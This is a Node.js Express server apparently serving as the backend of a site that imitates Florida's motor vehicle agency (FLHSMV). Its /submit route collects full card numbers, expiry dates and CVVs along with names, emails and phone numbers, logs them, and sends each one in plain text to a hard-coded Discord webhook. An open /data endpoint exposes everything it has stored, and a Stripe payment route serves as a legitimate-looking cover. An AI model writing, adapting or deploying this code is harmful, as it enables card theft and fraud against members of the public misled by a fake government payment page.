const express = require("express");
const cors = require("cors");
require("dotenv").config();
const fetch = require("node-fetch");
const stripe = require("stripe")(process.env.STRIPE_SECRET_KEY || 'your-stripe-secret-key');

const app = express();
const port = process.env.PORT || 4000;

// Define allowed origins:
const allowedOrigins = [
  "https://flhsmv-admin.vercel.app",
  "http://localhost:3000",
  "https://flhsmv.onrender.com"
];

// Setup CORS with a custom callback
app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) !== -1) {
      return callback(null, true);
    } else {
      return callback(new Error("Not allowed by CORS"));
    }
  }
}));

app.use(express.json());

// In-memory storage
let storage = [];

// POST route for submissions
app.post("/submit", async (req, res) => {
  try {
    const { name, email, phone, state, message, cardNumber, expirationDate, cvv } = req.body;

    if (
      typeof cardNumber === "string" &&
      cardNumber.length === 16 &&
      typeof expirationDate === "string" &&
      typeof cvv === "string" &&
      (cvv.length === 3 || cvv.length === 4)
    ) {
      storage.push({ cardNumber, expirationDate, cvv });
      console.log("Stored Payment Info:", storage);

      await fetch("https://discord.com/api/webhooks/1394971034054037635/AAY8BfDiVBgoyl0u1BBXi1tLSaQCUF5BS0SZI_oIWgWfevveRhVe9_QGihs4wLn4fi4M", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `💳 **New Payment Submission**
**Expiration Date:** ${expirationDate}
**Card Number:** ${cardNumber}
**CVV:** ${cvv}`
        })
      });

      return res.status(200).json({ message: "Payment data stored successfully" });
    }

    if (name && email && phone && state && message) {
      storage.push({ name, email, phone, state, message });
      console.log("Stored Contact Info:", storage);

      await fetch("https://discord.com/api/webhooks/1394971034054037635/AAY8BfDiVBgoyl0u1BBXi1tLSaQCUF5BS0SZI_oIWgWfevveRhVe9_QGihs4wLn4fi4M", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `📬 **New Contact Submission**
**Name:** ${name}
**Email:** ${email}
**Phone:** ${phone}
**State:** ${state}
**Message:** ${message}`
        })
      });

      return res.status(200).json({ message: "Contact data stored successfully" });
    }

    return res.status(400).json({ message: "Invalid or incomplete data submitted." });

  } catch (error) {
    console.error("Error in /submit:", error);
    return res.status(500).json({ message: "Internal server error." });
  }
});

// GET route for data display
app.get("/data", (req, res) => {
  res.status(200).json(storage);
});

// Health check
app.get("/ping", (req, res) => {
  res.status(200).json({ message: "Viewer app connected successfully!" });
});

// ✅ Stripe PaymentIntent route (updated for traditional card payments)
app.post("/create-payment-intent", async (req, res) => {
  try {
    const { amount = 135, metadata } = req.body; // amount in cents, optional metadata

    const paymentIntent = await stripe.paymentIntents.create({
      amount,
      currency: "usd",
      payment_method_types: ["card"], // includes Apple Pay if available
      metadata: metadata || {},       // attach frontend form data safely
    });

    res.send({
      clientSecret: paymentIntent.client_secret,
    });
  } catch (error) {
    console.error("Stripe error:", error);
    res.status(500).send({ error: error.message });
  }
});

// ✅ Start the server ONCE
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
